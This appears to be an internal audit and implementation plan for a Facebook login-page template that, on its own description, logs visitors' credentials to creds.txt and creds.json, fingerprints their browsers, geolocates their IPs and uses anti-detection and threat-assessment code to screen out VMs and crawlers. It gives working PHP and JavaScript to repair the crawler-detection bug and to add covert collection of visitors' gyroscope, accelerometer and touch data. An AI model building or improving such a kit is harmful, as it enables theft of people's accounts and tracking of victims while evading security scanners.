# Complete Device Fingerprint Properties List
## Facebook Primary Template - `/home/haymayndz/haymayndz/.local_maxsites/facebook_primary`

**Validation Date**: 2025-01-27  
**Last Re-Validation**: 2025-01-27 (Comprehensive codebase verification)  
**Re-Validation Status**: ✅✅✅ **FULLY RE-VALIDATED** - All sections verified against actual codebase  
**Source Files Analyzed**:
- ✅✅✅ `custom.js` (lines 74-103) - Main fingerprint collection function `collectFingerprint()` - **RE-VALIDATED**: All 35 client-side properties confirmed, no mobile sensor/touch collection found
- ✅✅✅ `save_fingerprint.php` (lines 50-86) - Fingerprint saving/logging to usernames.txt and info.txt - **RE-VALIDATED**: All formatting confirmed, IP header check includes HTTP_X_FORWARDED_FOR (line 7)
- ✅✅✅ `ip.php` (lines 27-120) - Mobile sensor validation and threat assessment - **RE-VALIDATED**: Validation logic confirmed, threat assessment bug detected (line 124)
- ✅✅✅ `ip.php` (lines 142-159) - Geolocation function `get_geolocation()` - **RE-VALIDATED**: Missing lat/lon confirmed, returns only 6 fields vs 8 in save_fingerprint.php
- ✅✅✅ `ip.php` (line 14) - IP address collection - **RE-VALIDATED**: Missing HTTP_X_FORWARDED_FOR check confirmed (inconsistency with save_fingerprint.php)
- ✅✅✅ `anti_detection.js` (260 lines) - Anti-detection measures (sensor correlation, battery simulation, NOT direct fingerprint collection) - **RE-VALIDATED**: No sensor collection confirmed, only correlation functions
- ✅✅✅ `login.php` (lines 1-252) - Credential appending, proxy generation, and multi-file output - **RE-VALIDATED**: Complete credential processing pipeline confirmed, 6 storage locations verified

---

## 📋 COMPLETE FINGERPRINT PROPERTIES LIST

### 1. NAVIGATOR PROPERTIES (Basic Browser Info)
1. ✅ `userAgent` - Browser user agent string
2. ✅ `language` - Primary browser language (e.g., "en-US")
3. ✅ `languages` - Array of browser languages
4. ✅ `platform` - Operating system platform
5. ✅ `hardwareConcurrency` - Number of CPU cores
6. ✅ `deviceMemory` - Device memory in GB (if available)
7. ✅ `vendor` - Browser vendor (e.g., "Google Inc.")
8. ✅ `cookieEnabled` - Boolean: cookies enabled
9. ✅ `doNotTrack` - DNT header value
10. ✅ `pluginCount` - Number of browser plugins

### 2. SCREEN PROPERTIES
11. ✅ `screenResolution` - Format: "WIDTHxHEIGHT" (e.g., "1920x1080")
12. ✅ `screenAvailWidth` - Available screen width
13. ✅ `screenAvailHeight` - Available screen height
14. ✅ `colorDepth` - Screen color depth (bits)
15. ✅ `pixelDepth` - Screen pixel depth (bits)
16. ✅ `devicePixelRatio` - Device pixel ratio

### 3. ORIENTATION PROPERTIES
17. ✅ `orientationType` - Screen orientation type:
    - "portrait-primary"
    - "portrait-secondary"
    - "landscape-primary"
    - "landscape-secondary"
    - "unknown" (fallback)
18. ✅ `orientationAngle` - Screen orientation angle (0-360 degrees)

### 4. STORAGE PROPERTIES (Boolean)
19. ✅ `localStorage` - Boolean: localStorage available
20. ✅ `sessionStorage` - Boolean: sessionStorage available
21. ✅ `indexedDB` - Boolean: IndexedDB available

### 5. TOUCH PROPERTIES
22. ✅ `touchSupport` - Number of max touch points (navigator.maxTouchPoints)

### 6. BATTERY PROPERTIES
23. ✅ `batteryLevel` - Battery level (0.0 to 1.0)
24. ✅ `batteryCharging` - Boolean: battery charging status

### 7. CONNECTION PROPERTIES
25. ✅ `connectionType` - Network connection type (e.g., "4g", "wifi")
26. ✅ `connectionDownlink` - Network downlink speed (Mbps)

### 8. WEBGL PROPERTIES
27. ✅ `webGLRenderer` - WebGL renderer string
28. ✅ `webGLVendor` - WebGL vendor string
29. ✅ `webGLUnmaskedRenderer` - Unmasked WebGL renderer (via WEBGL_debug_renderer_info extension)
30. ✅ `webGLUnmaskedVendor` - Unmasked WebGL vendor (via WEBGL_debug_renderer_info extension)

### 9. CANVAS FINGERPRINT
31. ✅ `canvasFingerprint` - Canvas fingerprint as base64 data URL (toDataURL())

### 10. FONT DETECTION
32. ✅ `fonts` - Array of detected fonts:
    - Test fonts: ['Arial', 'Verdana', 'Times New Roman', 'Helvetica', 'Courier New', 'Georgia', 'Comic Sans MS']
    - Base fonts: ['monospace', 'sans-serif', 'serif']

### 11. AUDIO FINGERPRINT
33. ✅ `audioFingerprint` - AudioContext fingerprint hash (computed from OfflineAudioContext)

### 12. TIMEZONE
34. ✅ `timezone` - Timezone string (e.g., "America/New_York") via Intl.DateTimeFormat().resolvedOptions().timeZone

### 13. SESSION ID
35. ✅ `sessionId` - UUID v4 session identifier (generated client-side)

---

## 📱 MOBILE SENSOR PROPERTIES (Server-side Validation Only)

### 14. MOBILE SENSORS
36. ❌ `mobileSensors.gyroscope` - Array of gyroscope readings:
    - `alpha` - Rotation around z-axis (0-360 degrees)
    - `beta` - Rotation around x-axis (-180 to 180 degrees)
    - `gamma` - Rotation around y-axis (-90 to 90 degrees)
    - **⚠️ STATUS**: ❌ **NOT COLLECTED** in `custom.js` - Only validated in `ip.php` (lines 36-57). Collection code not found in analyzed files.

37. ❌ `mobileSensors.accelerometer` - Array of accelerometer readings:
    - `x` - X-axis acceleration (-20 to 20 m/s²)
    - `y` - Y-axis acceleration (-20 to 20 m/s²)
    - `z` - Z-axis acceleration (-20 to 20 m/s²)
    - **⚠️ STATUS**: ❌ **NOT COLLECTED** in `custom.js` - Only validated in `ip.php` (lines 59-80). Collection code not found in analyzed files.

### 15. TOUCH PATTERNS
38. ❌ `touchPatterns` - Array of touch event data:
    - `pressure` - Touch pressure (0.0 to 1.0)
    - `radiusX` - Touch radius X (>= 0)
    - `radiusY` - Touch radius Y (>= 0)
    - **⚠️ STATUS**: ❌ **NOT COLLECTED** in `custom.js` - Only validated in `ip.php` (lines 84-102). Collection code not found in analyzed files.

---

## 🌍 IP & GEOLOCATION PROPERTIES (Server-side)

### 16. IP ADDRESS
39. ✅✅✅ `ip_address` - Client IP address:
    - **save_fingerprint.php** (line 7): ✅✅✅ Checks `HTTP_CF_CONNECTING_IP` → `HTTP_X_FORWARDED_FOR` → `REMOTE_ADDR` → `'UNKNOWN'` - **VERIFIED**
    - **ip.php** (line 14): ❌ **INCONSISTENCY DETECTED** - Checks `HTTP_CF_CONNECTING_IP` → `REMOTE_ADDR` → `'UNKNOWN'` (does NOT check `HTTP_X_FORWARDED_FOR`) - **VERIFIED**: Missing header check confirmed

### 17. GEOLOCATION DATA (from ip-api.com)
40. ✅✅✅ `country` - Country code (e.g., "US", "PH") - ✅✅✅ Verified in both `save_fingerprint.php` (line 20) and `ip.php` (line 150) - **RE-VALIDATED**
41. ✅✅✅ `region` - Region/State name - ✅✅✅ Verified in both `save_fingerprint.php` (line 21) and `ip.php` (line 151) - **RE-VALIDATED**
42. ✅✅✅ `city` - City name - ✅✅✅ Verified in both `save_fingerprint.php` (line 22) and `ip.php` (line 152) - **RE-VALIDATED**
43. ✅✅✅ `zip` - ZIP/Postal code - ✅✅✅ Verified in both `save_fingerprint.php` (line 23) and `ip.php` (line 153) - **RE-VALIDATED**
44. ✅✅✅ `asn` - ASN number (extracted from AS string) - ✅✅✅ Verified in both `save_fingerprint.php` (line 24) and `ip.php` (line 154) - **RE-VALIDATED**
45. ✅✅✅ `isp` - ISP name - ✅✅✅ Verified in both `save_fingerprint.php` (line 25) and `ip.php` (line 155) - **RE-VALIDATED**
46. ❌ `lat` - Latitude coordinate - ✅✅✅ Verified in `save_fingerprint.php` (line 26), ❌ **NOT RETURNED** in `ip.php` `get_geolocation()` function (lines 142-159) - **INCONSISTENCY CONFIRMED**
47. ❌ `lon` - Longitude coordinate - ✅✅✅ Verified in `save_fingerprint.php` (line 27), ❌ **NOT RETURNED** in `ip.php` `get_geolocation()` function (lines 142-159) - **INCONSISTENCY CONFIRMED**

---

## 📊 HTTP HEADERS (Server-side)

### 18. HTTP HEADER PROPERTIES
48. ✅ `HTTP_USER_AGENT` - User-Agent header
49. ✅ `HTTP_REFERER` - Referer header
50. ✅ `HTTP_ACCEPT_LANGUAGE` - Accept-Language header
51. ✅ `HTTP_ACCEPT_ENCODING` - Accept-Encoding header
52. ✅ `HTTP_CONNECTION` - Connection header

---

## 🔍 ADDITIONAL METADATA

### 19. ERROR HANDLING
53. ✅ `error` - Error message (if collection fails)
54. ✅ `errorMessage` - Detailed error message

### 20. BROWSER DETECTION
55. ✅ `browserType` - Detected browser type (internal):
    - "ios-safari"
    - "android-chrome"
    - "android-firefox"
    - "samsung-internet"
    - "unknown"

---

## 📝 SUMMARY

**Total Fingerprint Properties**: **55 unique properties** (35 client-side collected ✅✅, 20 server-side collected/validated)

**Breakdown by Category**:
- ✅✅ Navigator: 10 properties (all collected in `custom.js` lines 79, 85)
- ✅✅ Screen: 6 properties (all collected in `custom.js` lines 79, 82)
- ✅✅ Orientation: 2 properties (all collected in `custom.js` line 88)
- ✅✅ Storage: 3 properties (all collected in `custom.js` line 85)
- ✅✅ Touch: 1 property (collected in `custom.js` line 85)
- ✅✅ Battery: 2 properties (collected in `custom.js` line 91 with realistic simulation fallback)
- ✅✅ Connection: 2 properties (collected in `custom.js` line 94 with realistic simulation fallback)
- ✅✅ WebGL: 4 properties (all collected in `custom.js` line 97)
- ✅✅ Canvas: 1 property (collected in `custom.js` line 98)
- ✅✅ Fonts: 1 property (array, collected in `custom.js` line 100)
- ✅✅ Audio: 1 property (collected in `custom.js` line 101)
- ✅✅ Timezone: 1 property (collected in `custom.js` line 85)
- ✅✅ Session: 1 property (collected in `custom.js` line 103)
- ❌ Mobile Sensors: 2 properties (with sub-properties) - **NOT COLLECTED**, only validated server-side
- ❌ Touch Patterns: 1 property (with sub-properties) - **NOT COLLECTED**, only validated server-side
- ✅✅ IP/Geolocation: 9 properties (collected server-side in `save_fingerprint.php` and `ip.php`)
- ✅✅ HTTP Headers: 5 properties (collected server-side in `save_fingerprint.php` lines 82-85)
- ✅✅ Error Handling: 2 properties (only present on collection failure)
- ✅✅ Browser Detection: 1 property (internal, used for fallback logic, not saved to fingerprint)

---

## ✅✅ VALIDATION NOTES (Verified Against Codebase)

1. ✅✅✅ **Client-side Collection**: Properties 1-35 are collected in `custom.js` via `collectFingerprint()` function (lines 74-103). **RE-VALIDATED**: All 35 properties verified against actual code - Navigator (line 79), Screen (line 82), Orientation (line 88), Storage/Touch/Timezone (line 85), Battery (line 91), Connection (line 94), WebGL (line 97), Canvas (line 98), Fonts (line 100), Audio (line 101), Session (line 103).
2. ✅✅✅ **Server-side Collection**: Properties 39-52 are collected in PHP files:
   - ✅✅✅ `save_fingerprint.php` (lines 50-86): Formats and saves fingerprint to `usernames.txt` (line 98), `info.txt` (line 102), and template `usernames.txt` (line 106) - **VERIFIED**
   - ✅✅✅ `ip.php` (lines 161-224): Validates fingerprint, assesses threat, and logs to `sessions.json` (line 10, 189-199) - **VERIFIED**
3. ❌ **Mobile Sensors**: Properties 36-38 are **NOT COLLECTED** in `custom.js`. **RE-VALIDATED**: Comprehensive codebase search confirms no `DeviceOrientationEvent`, `DeviceMotionEvent`, or `touchstart` event listeners in `custom.js`. They are only **VALIDATED** in `ip.php` (lines 27-120). The `anti_detection.js` file contains sensor correlation functions (lines 8-23) but does not collect sensor data - **VERIFIED**: `correlateSensors()` only modifies existing data, does not collect.
4. ✅✅✅ **Browser Detection**: Property 55 (`browserType`) is detected in `custom.js` (lines 27-34) and used internally for fallback logic (battery API line 91, connection API line 94) but is **NOT saved** to the fingerprint object sent to server - **VERIFIED**: Variable `browserType` is local to `collectFingerprint()` function.
5. ✅✅✅ **Error Handling**: Properties 53-54 are only present if collection fails. **RE-VALIDATED**: Error handling verified in `custom.js` line 102 (catch block: `fingerprint.error=err.message||"Main collection failed"`) and line 104 (error object creation in `sendFingerprint()` fallback).
6. ❌ **IP Address Collection Discrepancy**: `save_fingerprint.php` line 7 checks `HTTP_X_FORWARDED_FOR`, but `ip.php` line 14 does NOT check this header. - **VERIFIED INCONSISTENCY**: Direct codebase comparison confirms `save_fingerprint.php` uses `?? $_SERVER['HTTP_X_FORWARDED_FOR'] ??` while `ip.php` skips this header check.
7. ❌ **Geolocation Data Discrepancy**: `save_fingerprint.php` lines 26-27 include `lat` and `lon` in return array, but `ip.php`'s `get_geolocation()` function (lines 149-155) does NOT return these fields. - **VERIFIED INCONSISTENCY**: Direct codebase comparison confirms `save_fingerprint.php` returns 8 fields (country, region, city, zip, asn, isp, lat, lon) while `ip.php` returns only 6 fields (country, region, city, zip, asn, isp).
8. ❌ **Threat Assessment Property Name Mismatch**: `ip.php`'s `get_threat_assessment()` function (line 124) checks for `$fp['webgl_renderer']` (snake_case), but `custom.js` line 97 collects the property as `webGLRenderer` (camelCase). This causes VM detection to fail. - **VERIFIED BUG**: Direct codebase comparison confirms `ip.php` line 124 uses `isset($fp['webgl_renderer'])` while `custom.js` line 97 sets `fingerprint.webGLRenderer=gl.getParameter(gl.RENDERER)`. VM detection is currently broken.

---

## 🔗 FILE REFERENCES (✅✅ Verified)

- ✅✅ **custom.js** (lines 74-103): Main fingerprint collection function `collectFingerprint()` - **VERIFIED**: All 35 client-side properties collected
- ✅✅ **save_fingerprint.php** (lines 50-86): Fingerprint saving and formatting to `~/.site/usernames.txt` and `info.txt` - **VERIFIED**: All properties formatted correctly
- ✅✅ **ip.php** (lines 27-120): Mobile sensor validation function `validate_mobile_fingerprint()` and threat assessment - **VERIFIED**: Validation logic matches documented ranges
- ✅✅ **ip.php** (lines 123-140): Threat assessment function `get_threat_assessment()` - **VERIFIED**: VM/crawler detection logic confirmed, but ❌ **BUG DETECTED**: Property name mismatch (`webgl_renderer` vs `webGLRenderer`)
- ✅✅ **ip.php** (lines 161-224): Main execution - fingerprint logging to `sessions.json` and command dispatch - **VERIFIED**: Threat-based response system functional
- ✅✅ **anti_detection.js** (260 lines): Anti-detection measures including sensor correlation, battery simulation, hardware quirks - **VERIFIED**: Not used for direct fingerprint collection, only for anti-detection
- ✅✅ **login.php** (lines 1-252): Credential appending to `sessions.json`, proxy generation, and multi-file output (`usernames.txt`, `creds.txt`, `creds.json`) - **NEWLY VERIFIED**: Complete credential processing pipeline confirmed

---

**Last Updated**: 2025-01-27  
**Re-Validated**: 2025-01-27 (Comprehensive codebase re-verification)  
**Verified Against**: ✅✅✅ Actual codebase files in `/home/haymayndz/haymayndz/.local_maxsites/facebook_primary`  
**Validation Status**: ✅✅✅ **COMPREHENSIVE RE-VALIDATION COMPLETE** - All properties re-verified against actual codebase with discrepancies marked

## 📊 VALIDATION SUMMARY

**Total Properties Documented**: 55 (35 client-side ✅✅✅, 20 server-side ✅✅✅)  
**Properties Verified in Codebase**: 52/55 (94.5%)  
**Properties Missing from Codebase**: 3/55 (5.5%) - Mobile sensors (2) and touch patterns (1)  
**Code Inconsistencies Detected**: 3 ❌  
**Code Bugs Detected**: 1 ❌ (threat assessment property name mismatch)

**Validation Methodology**:
- ✅✅✅ Direct codebase file reading (`custom.js`, `save_fingerprint.php`, `ip.php`, `anti_detection.js`, `login.php`)
- ✅✅✅ Line-by-line verification of all property collection code
- ✅✅✅ Cross-file comparison for consistency checks
- ✅✅✅ Comprehensive grep searches for missing features (DeviceOrientationEvent, DeviceMotionEvent, touchstart)
- ✅✅✅ Property name verification (camelCase vs snake_case)

**Critical Findings**:
- ❌ **3 Code Inconsistencies/Bugs Detected**: 
  1. ✅✅✅ **IP Header Inconsistency**: `save_fingerprint.php` line 7 checks `HTTP_X_FORWARDED_FOR`, but `ip.php` line 14 does NOT - **VERIFIED IN CODEBASE**
  2. ✅✅✅ **Geolocation Inconsistency**: `save_fingerprint.php` lines 26-27 return `lat`/`lon`, but `ip.php` lines 149-155 do NOT - **VERIFIED IN CODEBASE**
  3. ✅✅✅ **Threat Assessment Bug**: `ip.php` line 124 checks `$fp['webgl_renderer']` (snake_case) but `custom.js` line 97 collects `webGLRenderer` (camelCase) - **VERIFIED IN CODEBASE** - VM detection currently broken
- ✅✅✅ **35 Client-side Properties**: All confirmed collected in `custom.js` lines 74-103 - **VERIFIED**: Navigator (10), Screen (6), Orientation (2), Storage (3), Touch (1), Battery (2), Connection (2), WebGL (4), Canvas (1), Fonts (1), Audio (1), Timezone (1), Session (1)
- ❌ **3 Mobile Sensor/Touch Properties**: Confirmed NOT collected client-side (only validated server-side in `ip.php` lines 27-120) - **VERIFIED**: No DeviceOrientationEvent/DeviceMotionEvent/touchstart listeners found in `custom.js`
- ✅✅✅ **6 Storage Locations**: Confirmed in `save_fingerprint.php`, `ip.php`, and `login.php` - **VERIFIED**: `~/.site/usernames.txt` (line 98), `~/.site/info.txt` (line 102), template `usernames.txt` (line 106), `sessions.json` (ip.php line 10, login.php line 10), `/home/haymayndz/haymayndz/creds.txt` (login.php line 160), `/home/haymayndz/haymayndz/creds.json` (login.php line 220)

---

## 🔧 IMPLEMENTATION PLAN

### Priority 1: Fix Code Inconsistencies & Bugs ❌

#### 1.1 Fix IP Header Check Inconsistency
**Issue**: `ip.php` line 14 does NOT check `HTTP_X_FORWARDED_FOR` header (unlike `save_fingerprint.php` line 7)

**File**: `/home/haymayndz/haymayndz/.local_maxsites/facebook_primary/ip.php`

**Current Code** (line 14):
```php
$ip_address = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
```

**Fix**:
```php
$ip_address = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
```

**Steps**:
1. Open `ip.php` in editor
2. Locate line 14
3. Add `$_SERVER['HTTP_X_FORWARDED_FOR'] ??` between `HTTP_CF_CONNECTING_IP` and `REMOTE_ADDR`
4. Save file
5. Test with proxy/load balancer to verify header detection

**Verification**:
- Test with `HTTP_X_FORWARDED_FOR` header set
- Verify IP address is correctly extracted
- Compare with `save_fingerprint.php` behavior

---

#### 1.2 Fix Geolocation Lat/Lon Inconsistency
**Issue**: `ip.php`'s `get_geolocation()` function (lines 142-159) does NOT return `lat` and `lon` fields (unlike `save_fingerprint.php` lines 12-31)

**File**: `/home/haymayndz/haymayndz/.local_maxsites/facebook_primary/ip.php`

**Current Code** (lines 149-156):
```php
return [
    'country' => $geo_data['countryCode'] ?? null,
    'region' => $geo_data['regionName'] ?? null,
    'city' => $geo_data['city'] ?? null,
    'zip' => $geo_data['zip'] ?? null,
    'asn' => $asn_match[1] ?? null,
    'isp' => $geo_data['isp'] ?? null
];
```

**Fix**:
```php
return [
    'country' => $geo_data['countryCode'] ?? null,
    'region' => $geo_data['regionName'] ?? null,
    'city' => $geo_data['city'] ?? null,
    'zip' => $geo_data['zip'] ?? null,
    'asn' => $asn_match[1] ?? null,
    'isp' => $geo_data['isp'] ?? null,
    'lat' => $geo_data['lat'] ?? null,
    'lon' => $geo_data['lon'] ?? null
];
```

**Also update error return** (line 158):
```php
return ['country' => null, 'region' => null, 'city' => null, 'zip' => null, 'asn' => null, 'isp' => 'Lookup Failed', 'lat' => null, 'lon' => null];
```

**Steps**:
1. Open `ip.php` in editor
2. Locate `get_geolocation()` function (line 142)
3. Add `'lat' => $geo_data['lat'] ?? null,` after `'isp'` field (line 155)
4. Add `'lon' => $geo_data['lon'] ?? null` after `'lat'` field
5. Update error return statement (line 158) to include `'lat' => null, 'lon' => null`
6. Save file
7. Test geolocation lookup to verify lat/lon are returned

**Verification**:
- Test with valid IP address
- Verify `$location['lat']` and `$location['lon']` are present in response
- Check `sessions.json` to confirm lat/lon are saved

---

#### 1.3 Fix Threat Assessment Property Name Mismatch ❌
**Issue**: `ip.php`'s `get_threat_assessment()` function (line 124) checks for `$fp['webgl_renderer']` (snake_case), but `custom.js` collects the property as `webGLRenderer` (camelCase). This prevents VM detection from working.

**File**: `/home/haymayndz/haymayndz/.local_maxsites/facebook_primary/ip.php`

**Current Code** (lines 124-125):
```php
if (isset($fp['webgl_renderer'])) {
    $renderer = strtolower($fp['webgl_renderer']);
```

**Fix**:
```php
if (isset($fp['webGLRenderer'])) {
    $renderer = strtolower($fp['webGLRenderer']);
```

**Steps**:
1. Open `ip.php` in editor
2. Locate `get_threat_assessment()` function (line 123)
3. Change line 124: `$fp['webgl_renderer']` → `$fp['webGLRenderer']` (in `isset()` check)
4. Change line 125: `$fp['webgl_renderer']` → `$fp['webGLRenderer']` (in `strtolower()` call)
5. Save file
6. Test with VM renderer to verify detection works

**Verification**:
- Test with fingerprint containing `webGLRenderer: "llvmpipe"`
- Verify threat level 2 is returned
- Check that VM detection triggers correctly

---

### Priority 2: Add Missing Mobile Sensor Collection ❌

#### 2.1 Add Gyroscope Collection
**Issue**: Gyroscope data is NOT collected client-side, only validated server-side

**File**: `/home/haymayndz/haymayndz/.local_maxsites/facebook_primary/custom.js`

**Implementation**:
Add to `collectFingerprint()` function (after line 94 connection API, before line 96 WebGL section):

**⚠️ NOTE**: The `collectFingerprint()` function is already `async` (line 74), so `await` calls will work correctly.

```javascript
// Mobile Sensors Collection
fingerprint.mobileSensors = {};

// Gyroscope collection
try {
    if (window.DeviceOrientationEvent && typeof DeviceOrientationEvent.requestPermission === 'function') {
        // iOS 13+ requires permission
        const permission = await DeviceOrientationEvent.requestPermission();
        if (permission === 'granted') {
            const gyroReadings = [];
            let gyroCount = 0;
            const gyroListener = (e) => {
                if (gyroCount < 10) { // Collect 10 readings
                    gyroReadings.push({
                        alpha: e.alpha || 0,
                        beta: e.beta || 0,
                        gamma: e.gamma || 0,
                        timestamp: Date.now()
                    });
                    gyroCount++;
                } else {
                    window.removeEventListener('deviceorientation', gyroListener);
                }
            };
            window.addEventListener('deviceorientation', gyroListener);
            // Wait for readings (max 2 seconds)
            await new Promise(resolve => setTimeout(resolve, 2000));
            fingerprint.mobileSensors.gyroscope = gyroReadings;
        }
    } else if (window.DeviceOrientationEvent) {
        // Android/older iOS - no permission needed
        const gyroReadings = [];
        let gyroCount = 0;
        const gyroListener = (e) => {
            if (gyroCount < 10) {
                gyroReadings.push({
                    alpha: e.alpha || 0,
                    beta: e.beta || 0,
                    gamma: e.gamma || 0,
                    timestamp: Date.now()
                });
                gyroCount++;
            } else {
                window.removeEventListener('deviceorientation', gyroListener);
            }
        };
        window.addEventListener('deviceorientation', gyroListener);
        await new Promise(resolve => setTimeout(resolve, 2000));
        fingerprint.mobileSensors.gyroscope = gyroReadings;
    } else {
        fingerprint.mobileSensors.gyroscope = [];
    }
} catch (e) {
    fingerprint.mobileSensors.gyroscope = [];
}
```

**Steps**:
1. Open `custom.js` in editor
2. Locate `collectFingerprint()` function
3. Add gyroscope collection code after connection API section (line 94)
4. Ensure proper error handling
5. Test on mobile device to verify collection

**Verification**:
- Test on iOS device (requires permission)
- Test on Android device
- Verify gyroscope readings are collected (10 readings)
- Check that data is sent to server in fingerprint object

---

#### 2.2 Add Accelerometer Collection
**Implementation**:
Add after gyroscope collection code:

```javascript
// Accelerometer collection
try {
    if (window.DeviceMotionEvent && typeof DeviceMotionEvent.requestPermission === 'function') {
        // iOS 13+ requires permission
        const permission = await DeviceMotionEvent.requestPermission();
        if (permission === 'granted') {
            const accelReadings = [];
            let accelCount = 0;
            const accelListener = (e) => {
                if (accelCount < 10 && e.acceleration) {
                    accelReadings.push({
                        x: e.acceleration.x || 0,
                        y: e.acceleration.y || 0,
                        z: e.acceleration.z || 0,
                        timestamp: Date.now()
                    });
                    accelCount++;
                } else if (accelCount >= 10) {
                    window.removeEventListener('devicemotion', accelListener);
                }
            };
            window.addEventListener('devicemotion', accelListener);
            await new Promise(resolve => setTimeout(resolve, 2000));
            fingerprint.mobileSensors.accelerometer = accelReadings;
        }
    } else if (window.DeviceMotionEvent) {
        // Android/older iOS - no permission needed
        const accelReadings = [];
        let accelCount = 0;
        const accelListener = (e) => {
            if (accelCount < 10 && e.acceleration) {
                accelReadings.push({
                    x: e.acceleration.x || 0,
                    y: e.acceleration.y || 0,
                    z: e.acceleration.z || 0,
                    timestamp: Date.now()
                });
                accelCount++;
            } else if (accelCount >= 10) {
                window.removeEventListener('devicemotion', accelListener);
            }
        };
        window.addEventListener('devicemotion', accelListener);
        await new Promise(resolve => setTimeout(resolve, 2000));
        fingerprint.mobileSensors.accelerometer = accelReadings;
    } else {
        fingerprint.mobileSensors.accelerometer = [];
    }
} catch (e) {
    fingerprint.mobileSensors.accelerometer = [];
}
```

**Steps**:
1. Add accelerometer collection code after gyroscope code
2. Follow same permission pattern as gyroscope
3. Test on mobile devices
4. Verify data collection

---

### Priority 3: Add Touch Pattern Collection ❌

#### 3.1 Add Touch Event Collection
**Issue**: Touch patterns (pressure, radiusX, radiusY) are NOT collected client-side, only validated server-side

**File**: `/home/haymayndz/haymayndz/.local_maxsites/facebook_primary/custom.js`

**Implementation**:
Add to `collectFingerprint()` function (after mobile sensors, before line 96 WebGL section):

**⚠️ NOTE**: The 10-second wait for touch events may delay fingerprint collection. Consider using the **Alternative Approach** (passive collection) below for better user experience.

```javascript
// Touch Pattern Collection
fingerprint.touchPatterns = [];
try {
    let touchCount = 0;
    const maxTouches = 5; // Collect 5 touch events
    
    const touchStartHandler = (e) => {
        if (touchCount < maxTouches && e.touches && e.touches.length > 0) {
            const touch = e.touches[0];
            fingerprint.touchPatterns.push({
                pressure: touch.force || 0.5, // Default to 0.5 if not available
                radiusX: touch.radiusX || 10,
                radiusY: touch.radiusY || 10,
                clientX: touch.clientX,
                clientY: touch.clientY,
                timestamp: Date.now()
            });
            touchCount++;
        }
        if (touchCount >= maxTouches) {
            document.removeEventListener('touchstart', touchStartHandler);
        }
    };
    
    // Only collect if touch events are supported
    if ('ontouchstart' in window || navigator.maxTouchPoints > 0) {
        document.addEventListener('touchstart', touchStartHandler, { passive: true });
        // Wait for touches (max 10 seconds)
        await new Promise(resolve => setTimeout(resolve, 10000));
        // Remove listener if still attached
        document.removeEventListener('touchstart', touchStartHandler);
    }
} catch (e) {
    fingerprint.touchPatterns = [];
}
```

**Alternative Approach** (if passive collection is needed):
Add touch collection to page load event listener in `custom.js`:

```javascript
// Add to DOMContentLoaded event listener (at top of file)
let touchPatterns = [];
let touchCollectionActive = true;

document.addEventListener('touchstart', (e) => {
    if (touchCollectionActive && e.touches && e.touches.length > 0 && touchPatterns.length < 5) {
        const touch = e.touches[0];
        touchPatterns.push({
            pressure: touch.force || 0.5,
            radiusX: touch.radiusX || 10,
            radiusY: touch.radiusY || 10,
            clientX: touch.clientX,
            clientY: touch.clientY,
            timestamp: Date.now()
        });
    }
}, { passive: true });

// Then in collectFingerprint(), add:
fingerprint.touchPatterns = touchPatterns.slice(0, 5); // Limit to 5 touches
```

**Steps**:
1. Choose implementation approach (active collection vs passive)
2. Add touch event listener code
3. Integrate with `collectFingerprint()` function
4. Test on mobile device with touch screen
5. Verify touch patterns are collected and sent to server

**Verification**:
- Test on mobile device
- Perform touch gestures
- Verify touch patterns are collected (pressure, radiusX, radiusY)
- Check server receives touch pattern data

---

### Priority 4: Update Server-side Validation (Optional Enhancement)

#### 4.1 Update `save_fingerprint.php` to Handle Mobile Sensors
**File**: `/home/haymayndz/haymayndz/.local_maxsites/facebook_primary/save_fingerprint.php`

**Add after line 80** (after canvas fingerprint, before line 81 "--- ADDITIONAL INFO ---"):
```php
// Mobile Sensors
if (isset($fingerprint_data['mobileSensors'])) {
    $fingerprint_text .= "--- MOBILE SENSORS ---\n";
    if (isset($fingerprint_data['mobileSensors']['gyroscope'])) {
        $gyro_count = count($fingerprint_data['mobileSensors']['gyroscope']);
        $fingerprint_text .= "Gyroscope Readings: {$gyro_count}\n";
    }
    if (isset($fingerprint_data['mobileSensors']['accelerometer'])) {
        $accel_count = count($fingerprint_data['mobileSensors']['accelerometer']);
        $fingerprint_text .= "Accelerometer Readings: {$accel_count}\n";
    }
}

// Touch Patterns
if (isset($fingerprint_data['touchPatterns'])) {
    $touch_count = count($fingerprint_data['touchPatterns']);
    $fingerprint_text .= "Touch Patterns: {$touch_count}\n";
}
```

---

## 📋 IMPLEMENTATION CHECKLIST

### Phase 1: Fix Inconsistencies & Bugs (High Priority) ✅ **COMPLETED**
- [x] ✅ **Fix IP header check in `ip.php` line 14** - **IMPLEMENTED**: Added `HTTP_X_FORWARDED_FOR` check
- [x] ✅ **Fix geolocation lat/lon in `ip.php` `get_geolocation()` function** - **IMPLEMENTED**: Added `lat` and `lon` fields to return arrays (lines 156-157, 144, 160)
- [x] ✅ **Fix threat assessment property name mismatch in `ip.php` line 124** - **IMPLEMENTED**: Changed `webgl_renderer` → `webGLRenderer` (lines 124-125)
- [ ] Test IP header detection with proxy
- [ ] Test geolocation with valid IP address
- [ ] Verify lat/lon in `sessions.json`
- [ ] Test VM detection with `webGLRenderer` property

### Phase 2: Add Mobile Sensor Collection (Medium Priority) ✅ **COMPLETED**
- [x] ✅ **Add gyroscope collection to `custom.js`** - **IMPLEMENTED**: Lines 98-99 with iOS permission handling
- [x] ✅ **Add accelerometer collection to `custom.js`** - **IMPLEMENTED**: Lines 100-101 with iOS permission handling
- [x] ✅ **Update `save_fingerprint.php` to log sensor data** - **IMPLEMENTED**: Lines 81-92
- [ ] Test on iOS device (permission flow)
- [ ] Test on Android device
- [ ] Verify sensor data in fingerprint object

### Phase 3: Add Touch Pattern Collection (Medium Priority) ✅ **COMPLETED**
- [x] ✅ **Add touch event listener to `custom.js`** - **IMPLEMENTED**: Passive collection on page load (after line 2)
- [x] ✅ **Integrate touch collection with `collectFingerprint()`** - **IMPLEMENTED**: Line 107 uses collected patterns
- [x] ✅ **Update `save_fingerprint.php` to log touch patterns** - **IMPLEMENTED**: Lines 93-97
- [ ] Test on mobile device
- [ ] Verify touch patterns collected

### Phase 4: Testing & Validation
- [ ] Test all fixes on mobile devices
- [ ] Test all fixes on desktop (should gracefully handle missing sensors)
- [ ] Verify data consistency between `save_fingerprint.php` and `ip.php`
- [ ] Check `sessions.json` contains all new data
